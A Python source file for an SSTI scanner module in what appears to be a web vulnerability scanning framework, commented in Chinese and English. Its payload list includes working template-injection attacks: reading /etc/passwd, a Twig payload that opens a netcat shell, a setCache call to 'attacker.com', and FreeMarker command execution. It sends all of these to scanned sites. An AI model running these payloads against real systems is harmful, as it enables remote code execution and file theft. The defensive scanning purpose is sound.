"""
SSTI（服务端模板注入）漏洞扫描器
检测Web应用程序中的模板注入漏洞
"""

import re
import asyncio
import json
from typing import List, Dict, Any, Optional, Set
from urllib.parse import urlencode, urlparse, urlunparse

from playwright.async_api import Page
from .base import DASTScanner, Vulnerability, VulnerabilityType, SeverityLevel, ScanContext, ScanResult


class SSTIScanner(DASTScanner):
    """SSTI漏洞扫描器"""
    
    @property
    def name(self) -> str:
        return "SSTI扫描器"
        
    @property
    def description(self) -> str:
        return "检测服务端模板注入漏洞"
        
    @property
    def vuln_types(self) -> List[VulnerabilityType]:
        return [VulnerabilityType.SSTI]
        
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.test_params = self.config.get('test_params', True)
        self.test_body = self.config.get('test_body', True)
        self.safe_banners = self.config.get('safe_banners', [
            'DETECTED', 'SSTI', 'TEMPLATE', 'INJECTION'
        ])
        
        # 模板引擎检测模式
        self.template_patterns = {
            'jinja2': [
                r'\{\{.*\}\}',  # {{ 表达式 }}
                r'\{%-.*?-%\}',  # {%- 语句 -%}
                r'\{\#.*?\#\}',  # {# 注释 #}
            ],
            'twig': [
                r'\{\{.*\}\}',  # {{ 表达式 }}
                r'\{\%.*?\%\}',  # {% 语句 %}
                r'\{\#.*?\#\}',  # {# 注释 #}
            ],
            'freemarker': [
                r'\$\{.*\}',  # ${表达式}
                r'<#.*?>',  # <#指令>
                r'<@.*?>',  # <#宏>
            ],
            'velocity': [
                r'\$.*',  # $变量
                r'\#\{.*\}',  # #{表达式}
                r'#\w+\(.*\)',  # #指令()
            ],
            'smarty': [
                r'\{.*\}',  # {$变量}
                r'\{if.*\}',  # {if 条件}
                r'\{\/if\}',  # {/if}
            ],
            'thymeleaf': [
                r'th:.*=.*',  # th:text="${...}"
                r'\[\[.*\]\]',  # [[${...}]]
                r'\(\(.*\)\)',  # ((${...}))
            ],
        }
        
        # 按模板引擎组织的SSTI payload
        self.payloads = {
            'generic': [
                # 基础注入
                {'payload': '${{7*7}}', 'expected': '49', 'type': 'basic_math'},
                {'payload': '{{7*7}}', 'expected': '49', 'type': 'basic_math'},
                {'payload': '${7*7}', 'expected': '49', 'type': 'basic_math'},
                {'payload': '#{7*7}', 'expected': '49', 'type': 'basic_math'},
                
                # 字符串操作
                {'payload': '{{"test".upper()}}', 'expected': 'TEST', 'type': 'string_op'},
                {'payload': '${"test".toUpperCase()}', 'expected': 'TEST', 'type': 'string_op'},
                
                # 注释测试
                {'payload': '{{1+1}}{#comment#}', 'expected': '2', 'type': 'comment_test'},
                
                # 特殊字符
                {'payload': '${{@java.lang.Runtime@getRuntime().exec("calc")}}', 'expected': None, 'type': 'rce_blind'},
            ],
            'jinja2': [
                {'payload': '{{config.items()}}', 'expected': None, 'type': 'config_dump'},
                {'payload': '{{get_flashed_messages()}}', 'expected': None, 'type': 'flashed_messages'},
                {'payload': "{{''.__class__.__mro__[1].__subclasses__()}}", 'expected': None, 'type': 'class_dump'},
                {'payload': "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}", 'expected': None, 'type': 'file_read'},
            ],
            'twig': [
                {'payload': '{{_self.env.setCache("ftp://attacker.com:2121")}}{#_self.env.loadTemplate("backdoor")#}', 'expected': None, 'type': 'rce'},
                {'payload': '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")("/bin/sh -c \'nc -l -p 1337 -e /bin/sh\'")}}', 'expected': None, 'type': 'rce'},
            ],
            'freemarker': [
                {'payload': '${"freemarker.template.utility.Execute"?new()("calc")}', 'expected': None, 'type': 'rce'},
                {'payload': '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("calc")}', 'expected': None, 'type': 'rce'},
            ],
        }
        
    async def scan(self, context: ScanContext) -> ScanResult:
        """执行SSTI扫描"""
        vulnerabilities = []
        errors = []
        
        if not context.page:
            return ScanResult(
                scanner_id=self.scanner_id,
                vulnerabilities=vulnerabilities,
                errors=["未提供用于SSTI扫描的页面"],
                execution_time=0
            )
            
        try:
            # 首先，检测模板引擎
            detected_engine = await self._detect_template_engine(context)
            self.logger.info(f"检测到模板引擎: {detected_engine}")
            
            # 测试URL参数
            if self.test_params and context.params:
                await self._test_parameters(context, vulnerabilities, detected_engine)
                
            # 测试POST正文
            if self.test_body:
                await self._test_post_data(context, vulnerabilities, detected_engine)
                
            # 测试其他向量的SSTI
            await self._test_additional_vectors(context, vulnerabilities, detected_engine)
                
        except Exception as e:
            errors.append(f"SSTI扫描失败: {str(e)}")
            
        return ScanResult(
            scanner_id=self.scanner_id,
            vulnerabilities=vulnerabilities,
            errors=errors,
            execution_time=0
        )
        
    async def _detect_template_engine(self, context: ScanContext) -> Optional[str]:
        """检测正在使用的模板引擎"""
        try:
            # 获取页面内容
            content = await context.page.content()
            
            # 查找模板引擎签名
            for engine, patterns in self.template_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        return engine
                        
            # 检查URL中的常见模板文件扩展名
            parsed = urlparse(context.url)
            path = parsed.path.lower()
            
            template_extensions = {
                '.html': ['twig', 'jinja2', 'smarty'],
                '.tpl': ['smarty', 'freemarker'],
                '.template': ['freemarker', 'velocity'],
                '.vm': ['velocity'],
                '.ftl': ['freemarker'],
                '.twig': ['twig'],
                '.jinja': ['jinja2'],
                '.j2': ['jinja2'],
            }
            
            for ext, engines in template_extensions.items():
                if ext in path:
                    # 返回第一个匹配的引擎
                    return engines[0]
                    
            return None
            
        except Exception as e:
            self.logger.debug(f"检测模板引擎失败: {e}")
            return None
            
    async def _test_parameters(self, context: ScanContext, vulnerabilities: List[Vulnerability], engine: Optional[str]) -> None:
        """测试URL参数的SSTI漏洞"""
        if not context.params:
            return
            
        base_url = context.url
        
        # 选择合适的payload
        payloads = self._select_payloads(engine)
        
        for param_name, param_value in context.params.items():
            # 跳过不可注入的参数
            if self._skip_parameter(param_name):
                continue
                
            for payload_info in payloads[:5]:  # 限制每个参数的payload数量
                try:
                    # 创建测试参数
                    test_params = context.params.copy()
                    test_params[param_name] = payload_info["payload"]
                    
                    # 构建测试URL
                    parsed = urlparse(base_url)
                    query = urlencode(test_params)
                    test_url = urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        query,
                        parsed.fragment
                    ))
                    
                    # 导航到测试URL
                    response = await context.page.goto(test_url, wait_until="networkidle", timeout=5000)
                    
                    # 检查SSTI
                    if await self._check_ssti_response(context.page, payload_info):
                        vuln = self.create_vulnerability(
                            vuln_type=VulnerabilityType.SSTI,
                            name=f"URL参数中的SSTI",
                            description=f"URL参数 '{param_name}' 存在服务端模板注入漏洞",
                            severity=SeverityLevel.HIGH,
                            confidence="high",
                            location=f"{context.url}?{param_name}=...",
                            evidence=f"Payload: {payload_info['payload']}",
                            remediation="禁用用户输入的模板渲染，或使用沙箱化模板环境",
                            cwe_id="CWE-94"
                        )
                        vulnerabilities.append(vuln)
                        break  # 每个参数一个漏洞
                        
                    # 返回
                    await context.page.goto(base_url)
                    
                except Exception as e:
                    self.logger.debug(f"Failed to test parameter {param_name}: {e}")
                    continue
                    
    async def _test_post_data(self, context: ScanContext, vulnerabilities: List[Vulnerability], engine: Optional[str]) -> None:
        """Test POST data for SSTI"""
        try:
            # Find forms
            forms = await context.page.query_selector_all("form[method='post']")
            
            for form in forms:
                # Get form action
                action = await form.get_attribute("action") or context.url
                
                # Get form inputs
                inputs = await form.query_selector_all("input[name], textarea[name], select[name]")
                
                if not inputs:
                    continue
                    
                # Select payloads
                payloads = self._select_payloads(engine)
                
                # Test each input
                for input_field in inputs[:2]:  # Limit to first 2 inputs
                    input_name = await input_field.get_attribute("name")
                    
                    if self._skip_parameter(input_name):
                        continue
                        
                    for payload_info in payloads[:3]:  # Limit payloads
                        try:
                            # Fill form with payload
                            await input_field.fill(payload_info["payload"])
                            
                            # Submit form
                            await form.evaluate("form => form.submit()")
                            
                            # Wait for response
                            await context.page.wait_for_load_state("networkidle", timeout=5000)
                            
                            # Check for SSTI
                            if await self._check_ssti_response(context.page, payload_info):
                                vuln = self.create_vulnerability(
                                    vuln_type=VulnerabilityType.SSTI,
                                    name="SSTI in Form Input",
                                    description=f"Form input '{input_name}' is vulnerable to Server-Side Template Injection",
                                    severity=SeverityLevel.HIGH,
                                    confidence="high",
                                    location=action,
                                    evidence=f"Payload: {payload_info['payload']}",
                                    remediation="Disable template rendering in user input, or use sandboxed template environments",
                                    cwe_id="CWE-94"
                                )
                                vulnerabilities.append(vuln)
                                
                            # Go back
                            await context.page.go_back()
                            
                        except Exception as e:
                            self.logger.debug(f"Failed to test form input {input_name}: {e}")
                            continue
                            
        except Exception as e:
            self.logger.debug(f"Failed to test POST data: {e}")
            
    async def _test_additional_vectors(self, context: ScanContext, vulnerabilities: List[Vulnerability], engine: Optional[str]) -> None:
        """Test additional SSTI vectors"""
        # Test HTTP headers
        try:
            payloads = self._select_payloads(engine)
            
            # Test User-Agent
            for payload_info in payloads[:2]:
                await context.page.set_extra_http_headers({
                    "User-Agent": payload_info["payload"]
                })
                
                await context.page.reload(wait_until="networkidle")
                
                if await self._check_ssti_response(context.page, payload_info):
                    vuln = self.create_vulnerability(
                        vuln_type=VulnerabilityType.SSTI,
                        name="SSTI in User-Agent Header",
                        description="User-Agent header is vulnerable to Server-Side Template Injection",
                        severity=SeverityLevel.MEDIUM,
                        confidence="medium",
                        location=context.url,
                        evidence=f"Payload in User-Agent: {payload_info['payload']}",
                        remediation="Sanitize HTTP headers before template rendering",
                        cwe_id="CWE-94"
                    )
                    vulnerabilities.append(vuln)
                    break
                    
        except Exception as e:
            self.logger.debug(f"Failed to test additional vectors: {e}")
            
    def _select_payloads(self, engine: Optional[str]) -> List[Dict[str, Any]]:
        """根据检测到的引擎选择合适的payload"""
        if engine and engine in self.payloads:
            # 从通用payload开始，然后是引擎特定的
            return self.payloads['generic'] + self.payloads[engine]
        return self.payloads['generic']
        
    def _skip_parameter(self, param_name: str) -> bool:
        """检查是否应该跳过该参数"""
        skip_params = [
            'id', 'page', 'limit', 'offset', 'sort', 'order',
            'csrf_token', 'authenticity_token', '_token',
            'submit', 'button', 'action'
        ]
        return param_name.lower() in skip_params
        
    async def _check_ssti_response(self, page: Page, payload_info: Dict[str, Any]) -> bool:
        """检查SSTI payload是否执行"""
        try:
            content = await page.content()
            
            # 检查预期输出
            if payload_info.get('expected'):
                if payload_info['expected'] in content:
                    return True
                    
            # 检查模板错误
            error_indicators = [
                'template error',
                'template syntax error',
                'undefined variable',
                'unexpected end of template',
                'invalid template',
                'template parsing error',
                'jinja2.exceptions',
                'twig_error',
                'freemarker.core',
            ]
            
            for indicator in error_indicators:
                if indicator.lower() in content.lower():
                    return True
                    
            # 检查输出中的模板语法
            if '{{' in content or '}}' in content or '${' in content:
                # 检查是否是我们的payload被反射
                if payload_info['payload'] in content:
                    return True
                    
            # 检查数学运算
            if payload_info['type'] == 'basic_math' and payload_info.get('expected'):
                # 在页面中查找结果
                if payload_info['expected'] in content:
                    return True
                    
            return False
            
        except Exception:
            return False


# Register scanner
from .base import registry
registry.register(SSTIScanner)